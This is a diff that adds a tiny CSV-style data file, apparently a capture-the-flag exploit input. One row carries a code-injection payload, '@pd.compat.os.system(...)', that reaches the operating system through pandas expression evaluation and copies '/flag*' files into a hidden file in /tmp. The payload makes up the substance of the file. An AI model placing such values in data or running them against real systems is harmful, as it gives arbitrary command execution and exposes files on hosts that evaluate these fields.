@@ -1,0 +1,6 @@
+1,2,payload
+4,5,@pd.compat.os.system('cat /flag* > /tmp/random-string-hope-other-dont-see')
+4,5,b
+4,5,c
+4,5,a
+4,5,d
